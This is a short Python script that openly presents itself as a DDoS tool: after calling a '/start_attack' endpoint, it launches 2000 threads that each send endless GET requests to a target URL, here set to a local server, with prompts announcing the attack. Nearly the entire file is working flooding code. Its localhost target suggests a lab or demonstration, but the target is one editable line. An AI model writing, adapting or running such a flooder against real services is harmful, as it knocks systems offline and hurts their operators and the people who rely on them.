import threading
import requests

target_url = "http://127.0.0.1:5000"  # The target URL for the attack
start_attack_url = f"{target_url}/start_attack"  # URL to trigger the attack

def send_requests():
    while True:
        try:
            response = requests.get(target_url)
            print(f"Request sent: {response.status_code}")
        except requests.RequestException as e:
            print(f"Request failed: {e}")
        except Exception as e:
            print(f"Unexpected error: {e}")

num_threads = 2000  # Number of threads to overwhelm the server
threads = []

def start_ddos():
    # Trigger the attack on the server
    try:
        requests.get(start_attack_url)
        print("Attack triggered on the server.")
    except requests.RequestException as e:
        print(f"Failed to trigger attack: {e}")
        return

    for i in range(num_threads):
        thread = threading.Thread(target=send_requests)
        thread.daemon = True  # Daemon thread ensures it won't block the app
        thread.start()
        threads.append(thread)

if __name__ == "__main__":
    input("Press Enter to start the DDoS attack...")
    start_ddos()
    print("DDoS attack started. Press Ctrl+C to stop.")
    while True:
        pass  # Keep the main thread alive
